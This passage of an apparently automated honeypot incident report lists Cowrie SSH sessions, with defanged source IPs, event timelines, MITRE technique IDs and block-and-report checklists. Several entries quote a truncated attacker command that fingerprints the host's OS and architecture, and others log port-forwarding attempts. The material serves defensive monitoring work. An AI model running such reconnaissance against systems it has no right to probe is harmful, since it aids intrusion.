| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:24:42` | `cowrie.session.connect` |
| `2026-08-29 11:24:42` | `cowrie.client.version` |
| `2026-08-29 11:24:42` | `cowrie.client.kex` |
| `2026-08-29 11:24:43` | `cowrie.login.success` |
| `2026-08-29 11:24:43` | `cowrie.session.params` |
| `2026-08-29 11:24:43` | `cowrie.command.input` |
| `2026-08-29 11:24:43` | `cowrie.command.input` |
| `2026-08-29 11:24:43` | `cowrie.command.input` |
| `2026-08-29 11:24:43` | `cowrie.command.input` |
| `2026-08-29 11:24:43` | `cowrie.command.input` |
| `2026-08-29 11:24:43` | `cowrie.command.success` |
| `2026-08-29 11:24:43` | `cowrie.command.input` |
| `2026-08-29 11:24:43` | `cowrie.command.input` |
| `2026-08-29 11:24:43` | `cowrie.command.input` |
| `2026-08-29 11:24:43` | `cowrie.command.input` |
| `2026-08-29 11:24:44` | `cowrie.log.closed` |
| `2026-08-29 11:24:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bc6a981e4e3

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-29 11:24 |
| **Last Seen** | 2026-08-29 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:24:55` | `cowrie.session.connect` |
| `2026-08-29 11:24:55` | `cowrie.client.version` |
| `2026-08-29 11:24:55` | `cowrie.client.kex` |
| `2026-08-29 11:24:56` | `cowrie.login.success` |
| `2026-08-29 11:24:56` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:24:56` | `cowrie.direct-tcpip.data` |
| `2026-08-29 11:24:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b05f3739fc1

| Field | Detail |
|---|---|
| **Source IP** | `103.7.60[.]253` |
| **First Seen** | 2026-08-29 11:25 |
| **Last Seen** | 2026-08-29 11:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:25:16` | `cowrie.session.connect` |
| `2026-08-29 11:25:17` | `cowrie.client.version` |
| `2026-08-29 11:25:17` | `cowrie.client.kex` |
| `2026-08-29 11:25:18` | `cowrie.login.success` |
| `2026-08-29 11:25:19` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:25:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.7.60[.]253` to AbuseIPDB if not already reported
- [ ] Block `103.7.60[.]253` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7133bb930af9

| Field | Detail |
|---|---|
| **Source IP** | `183.89.208[.]174` |
| **First Seen** | 2026-08-29 11:25 |
| **Last Seen** | 2026-08-29 11:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:25:24` | `cowrie.session.connect` |
| `2026-08-29 11:25:25` | `cowrie.client.version` |
| `2026-08-29 11:25:25` | `cowrie.client.kex` |
| `2026-08-29 11:25:27` | `cowrie.login.success` |
| `2026-08-29 11:25:28` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:25:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.89.208[.]174` to AbuseIPDB if not already reported
- [ ] Block `183.89.208[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5b6a7a9d514

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 11:25 |
| **Last Seen** | 2026-08-29 11:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:25:48` | `cowrie.session.connect` |
| `2026-08-29 11:25:48` | `cowrie.client.version` |
| `2026-08-29 11:25:48` | `cowrie.client.kex` |
| `2026-08-29 11:25:49` | `cowrie.login.success` |
| `2026-08-29 11:25:49` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:25:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 11:25:49` | `cowrie.direct-tcpip.data` |
| `2026-08-29 11:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b0c8c4f2fe0

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:25 |
| **Last Seen** | 2026-08-29 11:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:25:49` | `cowrie.session.connect` |
| `2026-08-29 11:25:49` | `cowrie.client.version` |
| `2026-08-29 11:25:49` | `cowrie.client.kex` |
| `2026-08-29 11:25:49` | `cowrie.login.success` |
| `2026-08-29 11:25:50` | `cowrie.session.params` |
| `2026-08-29 11:25:50` | `cowrie.command.input` |
| `2026-08-29 11:25:50` | `cowrie.command.input` |
| `2026-08-29 11:25:50` | `cowrie.command.input` |
| `2026-08-29 11:25:50` | `cowrie.command.input` |
| `2026-08-29 11:25:50` | `cowrie.command.input` |
| `2026-08-29 11:25:50` | `cowrie.command.success` |
| `2026-08-29 11:25:50` | `cowrie.command.input` |
| `2026-08-29 11:25:50` | `cowrie.command.input` |
| `2026-08-29 11:25:50` | `cowrie.command.input` |
| `2026-08-29 11:25:50` | `cowrie.command.input` |
| `2026-08-29 11:25:51` | `cowrie.log.closed` |
| `2026-08-29 11:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e549bbb23a04

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:26 |
| **Last Seen** | 2026-08-29 11:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:26:53` | `cowrie.session.connect` |
| `2026-08-29 11:26:53` | `cowrie.client.version` |
| `2026-08-29 11:26:54` | `cowrie.client.kex` |
| `2026-08-29 11:26:54` | `cowrie.login.success` |
| `2026-08-29 11:26:55` | `cowrie.session.params` |
| `2026-08-29 11:26:55` | `cowrie.command.input` |
| `2026-08-29 11:26:55` | `cowrie.command.input` |
| `2026-08-29 11:26:55` | `cowrie.command.input` |
| `2026-08-29 11:26:55` | `cowrie.command.input` |
| `2026-08-29 11:26:55` | `cowrie.command.input` |
| `2026-08-29 11:26:55` | `cowrie.command.success` |
| `2026-08-29 11:26:55` | `cowrie.command.input` |
| `2026-08-29 11:26:55` | `cowrie.command.input` |
| `2026-08-29 11:26:55` | `cowrie.command.input` |
| `2026-08-29 11:26:55` | `cowrie.command.input` |
| `2026-08-29 11:26:55` | `cowrie.log.closed` |
| `2026-08-29 11:26:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c90ea761d5d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-29 11:27 |
| **Last Seen** | 2026-08-29 11:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:27:55` | `cowrie.session.connect` |
| `2026-08-29 11:27:55` | `cowrie.client.version` |
| `2026-08-29 11:27:55` | `cowrie.client.kex` |
| `2026-08-29 11:27:56` | `cowrie.login.success` |
| `2026-08-29 11:27:56` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:27:56` | `cowrie.direct-tcpip.data` |
| `2026-08-29 11:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3526c7abf2b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:28 |
| **Last Seen** | 2026-08-29 11:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:28:00` | `cowrie.session.connect` |
| `2026-08-29 11:28:00` | `cowrie.client.version` |
| `2026-08-29 11:28:00` | `cowrie.client.kex` |
| `2026-08-29 11:28:01` | `cowrie.login.success` |
| `2026-08-29 11:28:02` | `cowrie.session.params` |
| `2026-08-29 11:28:02` | `cowrie.command.input` |
| `2026-08-29 11:28:02` | `cowrie.command.input` |
| `2026-08-29 11:28:02` | `cowrie.command.input` |
| `2026-08-29 11:28:02` | `cowrie.command.input` |
| `2026-08-29 11:28:02` | `cowrie.command.input` |
| `2026-08-29 11:28:02` | `cowrie.command.success` |
| `2026-08-29 11:28:02` | `cowrie.command.input` |
| `2026-08-29 11:28:02` | `cowrie.command.input` |
| `2026-08-29 11:28:02` | `cowrie.command.input` |
| `2026-08-29 11:28:02` | `cowrie.command.input` |
| `2026-08-29 11:28:02` | `cowrie.log.closed` |
| `2026-08-29 11:28:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11aa7d4e4045

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 11:29 |
| **Last Seen** | 2026-08-29 11:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:29:01` | `cowrie.session.connect` |
| `2026-08-29 11:29:01` | `cowrie.client.version` |
| `2026-08-29 11:29:01` | `cowrie.client.kex` |
| `2026-08-29 11:29:02` | `cowrie.login.success` |
| `2026-08-29 11:29:02` | `cowrie.direct-tcpip.request` |
| `2026-08-29 11:29:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 11:29:02` | `cowrie.direct-tcpip.data` |
| `2026-08-29 11:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d73ba6bfd74

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:29 |
| **Last Seen** | 2026-08-29 11:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:29:07` | `cowrie.session.connect` |
| `2026-08-29 11:29:07` | `cowrie.client.version` |
| `2026-08-29 11:29:07` | `cowrie.client.kex` |
| `2026-08-29 11:29:08` | `cowrie.login.success` |
| `2026-08-29 11:29:09` | `cowrie.session.params` |
| `2026-08-29 11:29:09` | `cowrie.command.input` |
| `2026-08-29 11:29:09` | `cowrie.command.input` |
| `2026-08-29 11:29:09` | `cowrie.command.input` |
| `2026-08-29 11:29:09` | `cowrie.command.input` |
| `2026-08-29 11:29:09` | `cowrie.command.input` |
| `2026-08-29 11:29:09` | `cowrie.command.success` |
| `2026-08-29 11:29:09` | `cowrie.command.input` |
| `2026-08-29 11:29:09` | `cowrie.command.input` |
| `2026-08-29 11:29:09` | `cowrie.command.input` |
| `2026-08-29 11:29:09` | `cowrie.command.input` |
| `2026-08-29 11:29:09` | `cowrie.log.closed` |
| `2026-08-29 11:29:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5530f2d3c46

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:30 |
| **Last Seen** | 2026-08-29 11:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:30:18` | `cowrie.session.connect` |
| `2026-08-29 11:30:18` | `cowrie.client.version` |
| `2026-08-29 11:30:18` | `cowrie.client.kex` |
| `2026-08-29 11:30:19` | `cowrie.login.success` |
| `2026-08-29 11:30:20` | `cowrie.session.params` |
| `2026-08-29 11:30:20` | `cowrie.command.input` |
| `2026-08-29 11:30:20` | `cowrie.command.input` |
| `2026-08-29 11:30:20` | `cowrie.command.input` |
| `2026-08-29 11:30:20` | `cowrie.command.input` |
| `2026-08-29 11:30:20` | `cowrie.command.input` |
| `2026-08-29 11:30:20` | `cowrie.command.success` |
| `2026-08-29 11:30:20` | `cowrie.command.input` |
| `2026-08-29 11:30:20` | `cowrie.command.input` |
| `2026-08-29 11:30:20` | `cowrie.command.input` |
| `2026-08-29 11:30:20` | `cowrie.command.input` |
| `2026-08-29 11:30:20` | `cowrie.log.closed` |
| `2026-08-29 11:30:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebfa9883d620

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:31 |
| **Last Seen** | 2026-08-29 11:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:31:30` | `cowrie.session.connect` |
| `2026-08-29 11:31:30` | `cowrie.client.version` |
| `2026-08-29 11:31:30` | `cowrie.client.kex` |
| `2026-08-29 11:31:30` | `cowrie.login.success` |
| `2026-08-29 11:31:31` | `cowrie.session.params` |
| `2026-08-29 11:31:31` | `cowrie.command.input` |
| `2026-08-29 11:31:31` | `cowrie.command.input` |
| `2026-08-29 11:31:31` | `cowrie.command.input` |
| `2026-08-29 11:31:31` | `cowrie.command.input` |
| `2026-08-29 11:31:31` | `cowrie.command.input` |
| `2026-08-29 11:31:31` | `cowrie.command.success` |
| `2026-08-29 11:31:31` | `cowrie.command.input` |
| `2026-08-29 11:31:31` | `cowrie.command.input` |
| `2026-08-29 11:31:31` | `cowrie.command.input` |
| `2026-08-29 11:31:31` | `cowrie.command.input` |
| `2026-08-29 11:31:32` | `cowrie.log.closed` |
| `2026-08-29 11:31:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3918f7c2a8d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:32 |
| **Last Seen** | 2026-08-29 11:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:32:41` | `cowrie.session.connect` |
| `2026-08-29 11:32:41` | `cowrie.client.version` |
| `2026-08-29 11:32:41` | `cowrie.client.kex` |
| `2026-08-29 11:32:41` | `cowrie.login.success` |
| `2026-08-29 11:32:42` | `cowrie.session.params` |
| `2026-08-29 11:32:42` | `cowrie.command.input` |
| `2026-08-29 11:32:42` | `cowrie.command.input` |
| `2026-08-29 11:32:42` | `cowrie.command.input` |
| `2026-08-29 11:32:42` | `cowrie.command.input` |
| `2026-08-29 11:32:42` | `cowrie.command.input` |
| `2026-08-29 11:32:42` | `cowrie.command.success` |
| `2026-08-29 11:32:42` | `cowrie.command.input` |
| `2026-08-29 11:32:42` | `cowrie.command.input` |
| `2026-08-29 11:32:42` | `cowrie.command.input` |
| `2026-08-29 11:32:42` | `cowrie.command.input` |
| `2026-08-29 11:32:43` | `cowrie.log.closed` |
| `2026-08-29 11:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52d17886f81c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-29 11:33 |
| **Last Seen** | 2026-08-29 11:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 11:33:49` | `cowrie.session.connect` |
| `2026-08-29 11:33:49` | `cowrie.client.version` |
| `2026-08-29 11:33:49` | `cowrie.client.kex` |
| `2026-08-29 11:33:50` | `cowrie.login.success` |
| `2026-08-29 11:33:51` | `cowrie.session.params` |
| `2026-08-29 11:33:51` | `cowrie.command.input` |
| `2026-08-29 11:33:51` | `cowrie.command.input` |
| `2026-08-29 11:33:51` | `cowrie.command.input` |
| `2026-08-29 11:33:51` | `cowrie.command.input` |
| `2026-08-29 11:33:51` | `cowrie.command.input` |
| `2026-08-29 11:33:51` | `cowrie.command.success` |
| `2026-08-29 11:33:51` | `cowrie.command.input` |
| `2026-08-29 11:33:51` | `cowrie.command.input` |
| `2026-08-29 11:33:51` | `cowrie.command.input` |
| `2026-08-29 11:33:51` | `cowrie.command.input` |
| `2026-08-29 11:33:51` | `cowrie.log.closed` |
| `2026-08-29 11:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0c7175220f0

| Field | Detail |
|---|---|
| **Source IP** | `78.72.168[.]178` |
| **First Seen** | 2026-08-29 11:34 |
| **Last Seen** | 2026-08-29 11:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
